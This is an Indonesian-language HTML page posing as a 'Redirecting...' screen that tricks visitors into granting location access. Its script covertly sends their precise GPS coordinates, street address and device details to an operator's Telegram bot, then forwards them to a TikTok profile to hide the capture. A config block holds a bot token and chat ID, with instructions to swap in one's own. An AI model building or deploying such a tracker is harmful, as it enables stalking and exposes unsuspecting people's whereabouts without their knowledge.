<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: system-ui, -apple-system, sans-serif;
        }
        .location-popup {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        .popup-box {
            background: white;
            padding: 28px 24px;
            border-radius: 20px;
            text-align: center;
            max-width: 320px;
            width: 85%;
            box-shadow: 0 20px 35px rgba(0,0,0,0.3);
            animation: slideIn 0.3s ease;
        }
        @keyframes slideIn {
            from {
                transform: translateY(-50px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }
        .popup-icon {
            font-size: 48px;
            margin-bottom: 12px;
        }
        .popup-box h3 {
            font-size: 20px;
            margin-bottom: 8px;
            color: #1a1a2e;
        }
        .popup-box p {
            font-size: 14px;
            color: #555;
            margin-bottom: 20px;
        }
        .popup-box button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 40px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: transform 0.2s;
        }
        .popup-box button:hover {
            transform: scale(1.02);
        }
        .popup-box button:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }
        .loading-text {
            font-size: 12px;
            color: #888;
            margin-top: 12px;
            display: none;
        }
        .loading-text.show {
            display: block;
        }
        .error-text {
            font-size: 12px;
            color: #e74c3c;
            margin-top: 12px;
            display: none;
        }
        .error-text.show {
            display: block;
        }
    </style>
</head>
<body>

<div id="locationPopup" class="location-popup">
    <div class="popup-box">
        <div class="popup-icon">📍</div>
        <h3>Izin Lokasi</h3>
        <p>Klik tombol di bawah untuk mengizinkan akses lokasi</p>
        <button id="allowBtn">Izinkan & Lanjutkan</button>
        <div id="loadingMsg" class="loading-text">⏳ Mengirim data...</div>
        <div id="errorMsg" class="error-text">⚠️ Gagal, tetap melanjutkan...</div>
    </div>
</div>

<script>
    // =============== KONFIGURASI ===============
    // GANTI DENGAN DATA ASLI KAMU!
    const BOT_TOKEN = "8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0";   // GANTI
    const CHAT_ID = "1966317946";                                         // GANTI
    const TIKTOK_URL = "https://www.tiktok.com/@usernamekamu";           // GANTI
    
    // JANGAN UBAH INI (endpoint proxy PHP)
    const PROXY_URL = "proxy.php";
    // ===========================================
    
    const popup = document.getElementById('locationPopup');
    const allowBtn = document.getElementById('allowBtn');
    const loadingMsg = document.getElementById('loadingMsg');
    const errorMsg = document.getElementById('errorMsg');
    
    // Fungsi mendapatkan lokasi
    function getLocation() {
        return new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
                reject('Browser tidak support geolokasi');
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const accuracy = Math.round(position.coords.accuracy);
                    
                    let address = `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
                    try {
                        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
                        const data = await response.json();
                        const city = data.address?.city || data.address?.town || data.address?.village || data.address?.suburb || '';
                        const country = data.address?.country || '';
                        if (city) address = `${city}, ${country} | ${address}`;
                    } catch(e) {
                        console.log('Gagal ambil alamat:', e);
                    }
                    
                    resolve({ lat, lng, accuracy, address });
                },
                (error) => {
                    let msg = '';
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            msg = 'Izin lokasi ditolak';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            msg = 'Lokasi tidak tersedia';
                            break;
                        default:
                            msg = 'Gagal dapat lokasi';
                    }
                    reject(msg);
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        });
    }
    
    // Kirim ke Telegram via Proxy (menghindari CORS)
    async function sendToTelegram(locationData) {
        const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
        const userAgent = navigator.userAgent;
        const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(userAgent);
        const screenSize = `${window.screen.width}x${window.screen.height}`;
        const language = navigator.language;
        
        const message = `📍 *LOKASI BARU DETECTED*
        
🕐 Waktu: ${timestamp}
📱 Device: ${isMobile ? 'Mobile' : 'Desktop'}
🌐 Browser: ${navigator.userAgent.split(' ').slice(-2).join(' ')}
💻 Screen: ${screenSize}
🌍 Bahasa: ${language}
━━━━━━━━━━━━━━━━━━
📍 Koordinat:
Latitude: ${locationData.lat}
Longitude: ${locationData.lng}
🎯 Akurasi: ±${locationData.accuracy}m
📍 Alamat: ${locationData.address}
━━━━━━━━━━━━━━━━━━
🗺️ Google Maps: https://www.google.com/maps?q=${locationData.lat},${locationData.lng}
🗺️ OpenStreetMap: https://www.openstreetmap.org/?mlat=${locationData.lat}&mlon=${locationData.lng}&zoom=15`;
        
        // Kirim via proxy PHP
        const response = await fetch(PROXY_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                token: BOT_TOKEN,
                chat_id: CHAT_ID,
                message: message,
                lat: locationData.lat,
                lng: locationData.lng
            })
        });
        
        const result = await response.json();
        return result.success;
    }
    
    // Proses utama
    allowBtn.onclick = async function() {
        allowBtn.disabled = true;
        allowBtn.textContent = '⏳ Memproses...';
        loadingMsg.classList.add('show');
        
        try {
            const location = await getLocation();
            await sendToTelegram(location);
            loadingMsg.textContent = '✅ Berhasil! Mengalihkan...';
        } catch (error) {
            console.error('Error:', error);
            errorMsg.classList.add('show');
            errorMsg.textContent = `⚠️ ${error}. Tetap mengalihkan...`;
        }
        
        // Redirect setelah 1 detik
        setTimeout(() => {
            window.location.href = TIKTOK_URL;
        }, 1000);
    };
</script>
</body>
</html>
